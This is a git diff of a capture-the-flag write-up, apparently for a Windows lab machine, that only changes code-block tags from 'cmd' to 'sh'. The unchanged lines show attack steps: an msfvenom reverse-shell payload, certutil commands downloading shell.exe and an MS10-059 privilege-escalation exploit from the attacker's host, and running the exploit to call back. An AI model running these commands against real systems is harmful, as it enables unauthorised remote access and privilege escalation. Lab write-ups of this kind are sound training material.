@@ -58,11 +58,11 @@ user.txt: `e29ad89891462e0b09741e3082f44a2f`
 
 We upload a shell to `C:\Users\merlin\Desktop` and execute that to get another shell this time with more output
 
-```cmd
+```sh
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.27 LPORT=5555 -f exe > shell.exe
 ```
 
-```cmd
+```sh
 certutil.exe -urlcache -split -f "http://10.10.14.27/shell.exe" C:\Users\merlin\Desktop\shell.exe
 ```
 
@@ -70,11 +70,11 @@ certutil.exe -urlcache -split -f "http://10.10.14.27/shell.exe" C:\Users\merlin\
 
 We see that ms10-059 is available.
 
-```cmd
+```sh
 certutil.exe -urlcache -split -f "http://10.10.14.27/MS10-059.exe" C:\Users\merlin\Desktop\MS10-059.exe
 ```
 
-```cmd
+```sh
 C:\Users\merlin\Desktop>MS10-059.exe 10.10.14.27 6666
 ```
 
